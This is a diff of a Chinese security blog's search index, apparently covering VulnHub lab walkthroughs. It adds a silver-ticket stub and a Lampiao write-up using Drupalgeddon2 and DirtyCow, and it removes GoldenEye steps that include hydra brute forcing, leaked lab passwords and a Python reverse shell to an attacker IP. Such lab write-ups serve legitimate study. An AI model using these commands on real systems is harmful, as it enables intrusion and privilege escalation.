@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>域渗透提权维权之银票</title>
+    <url>/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/</url>
+    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>白银票据是用获得的TGT票据与TGS交互获取ST</p>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1>]]></content>
+      <tags>
+        <tag>提权</tag>
+        <tag>渗透测试</tag>
+        <tag>域渗透</tag>
+        <tag>网络空间安全</tag>
+        <tag>白银票据</tag>
+        <tag>维持权限</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域渗透提权维权之dcsync</title>
     <url>/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/</url>
     <content><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>DCSync是mimikatz的功能/命令。dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式模仿域控从真实的域控当中请求数据获得想要的用户hash</strong></p>
@@ -232,126 +246,75 @@
 
 
 
-<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>
+<h2 id="服务扫描及信息收集"><a href="#服务扫描及信息收集" class="headerlink" title="服务扫描及信息收集"></a>服务扫描及信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/02/vulnHub-Lampiao/1.png"></p>
 <p>22：ssh</p>
 <p>80</p>
-<p>1898：apache 2.4.7</p>
-<p>还有一个服务识别不了，返回数据</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\3.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\4.png"></p>
-<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\5.png"></p>
-<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
-<p>通过报错信息也可看到中间件为apache</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\6.png"></p>
-<p>访问terminal.js看到以下信息</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\7.png"></p>
-<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\8.png"></p>
+<p>1898：apache 2.4.7，此服务识别不了，直接返回数据</p>
+<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><p>访问1898端口为用户登录页面。dirb扫1898服务所有目录，发现敏感目录robots.txt</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/2.png"></p>
+<p>robots.txt中记录了网站日志更改记录文件</p>
+<h2 id="durpal"><a href="#durpal" class="headerlink" title="durpal"></a>durpal</h2><p>用durpal7的cms建站</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search dupral</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.221.136</span><br><span class="line"><span class="built_in">set</span> rport 1898</span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 直接拿下shell </span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>但www-data权限较低</p>
+<p>切换到/bin/bash目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到home路径下，<strong>用户名为tiago</strong></p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>网站一般有数据库的配置文件，在/var/www/html/sites/下有setting.php中写了数据库的用户名和密码</p>
+<p>用户名：drupaluser</p>
+<p>密码：Virgulino</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/database.png"></p>
+<p>在users表中发现name和password。密码一般为md5加密，但并未查出来</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/users2.png"></p>
+<h2 id="SSH访问服务器"><a href="#SSH访问服务器" class="headerlink" title="SSH访问服务器"></a>SSH访问服务器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh tiago@192.168.221.136</span><br></pre></td></tr></table></figure>
+
+<p>以tiago身份登录服务器成功</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看靶机内核</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>考虑用16年的dirtycow提取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search </span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/02/vulnHub-Lampiao/8.png"></p>
+<p>靶机：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget  http:&#x2F;&#x2F;192.168.221.130&#x2F;40847.cpp</span><br><span class="line">chmod 777 40847.cpp</span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">.&#x2F;dcow -s</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>加密格式总结：</p>
-<ul>
-<li>Unicode：\u开头</li>
-<li>UTF8/URL：%开头</li>
-<li>UTF16：\x开头</li>
-<li>&amp;#73;：　73为ASCII码，对应I</li>
-</ul>
+<p>参数解释：</p>
+<ol>
+<li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li>
+<li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li>
+<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
+<li>-std=c++11就是用按C++2011标准来编译的</li>
+<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
+<li>-o dcow gcc生成的目标文件,名字为dcow</li>
+</ol>
 </blockquote>
-<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\9.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\10.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\19.png"></p>
-<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\11.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\12.png"></p>
-<p>密码为 secret1!</p>
-<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\13.png"></p>
-<p>其中三封邮件内容如下，</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\14.png"></p>
-<p>root发给boris的邮件</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\15.png"></p>
-<p>natalya发给boris的邮件</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\16.png"></p>
-<p>alec发给boris的邮件</p>
-<p>再查看natalya的邮件有什么信息。</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\17.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\18.png"></p>
-<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>
-
-<p>打开本机/etc/hosts。添加域信息</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\20.png"></p>
-<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\21.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\22.png"></p>
-<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\23.png"></p>
-<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
-<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
-<p>靶机：GoldenEye 192.168.221.128</p>
-<p>攻击机：kali 192.168.221.130</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\24.png"></p>
-<p>得到doak的CMS的账户密码：</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\25.png"></p>
-<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\26.png"></p>
-<p>找到一个jpg文件位于以下位置：</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\27.png"></p>
-<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\28.png"></p>
-<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
-<p>账号：admin</p>
-<p>密码：xWinter1995x!</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\29.png"></p>
-<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\30.png"></p>
-<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
-<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
-
-<p>监听本机8099端口</p>
-<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\33.png"></p>
-<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\34.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\35.png"></p>
-<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>进入靶机/tmp目录下载EXP</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\36.png"></p>
-<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\40.png"></p>
-<p>然后重新下载shell并编译</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\37.png"></p>
-<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\38.png"></p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\39.png"></p>
-<p>we get it!</p>
-<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\41.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/12.png"></p>
+<p>拿到flag</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/13.png"></p>
 <h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
-<li><p>此处apache中间件无用武之地</p>
+<li>其实一般流程就是信息收集：</li>
+<li><ol>
+<li>端口 服务，再者是网站的目录，获取普通权限。</li>
+<li>获取使用的CMS或者中间件，去查找其对应的漏洞，然后上传exp，编译执行拿到一定权限。</li>
+<li>进入bin/bash。查找网站配置文件，寻找数据库用户名密码登录拖库。</li>
+<li>亦或者是ssh连接，然后用提权EXP进行提权，最终拿到root权限</li>
+</ol>
 </li>
-<li><p>用户名小写我是没想到</p>
-</li>
+<li>远程bash的上下左右键或者delete键键入会产生很奇怪的符号，敲代码的时候就很难受</li>
+<li>脏牛提权脚本中有其如何执行的注释，之后的EXP记得看</li>
 </ul>
+<h1 id="0x05-todolist"><a href="#0x05-todolist" class="headerlink" title="0x05 todolist"></a>0x05 todolist</h1><ol>
+<li>dirtycow漏洞具体原理</li>
+<li>dupal漏洞的具体原理</li>
+</ol>
 <h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li>靶机地址：<a href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
-<li>文章参考：<a href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
-<li><a href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
-<li>nc实现telnet连接pop3：<a href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
-<li>aspell参考：<a href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
-<li>tty-teletypewriter：<a href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
+<li>靶机地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li>
+<li>文章参考：<a href="https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/ce319b350885?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li>
 </ol>
 ]]></content>
       <tags>
